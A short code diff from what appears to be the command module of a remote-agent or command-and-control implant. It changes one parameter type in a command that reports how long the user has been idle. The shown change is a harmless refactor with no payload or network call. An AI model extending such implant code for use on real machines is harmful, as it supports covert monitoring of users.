@@ -34,7 +34,7 @@ namespace Agent.Commands
             var res = utcnow.Subtract(lastInputTime);
             return res;
         }
-        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, CommModule commm)
+        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, MessageManager commm)
         {
             var timespan = GetIdleTime();
             result.Result = $"Idle for {timespan.Hours}:{timespan.Minutes}:{timespan.Seconds}";
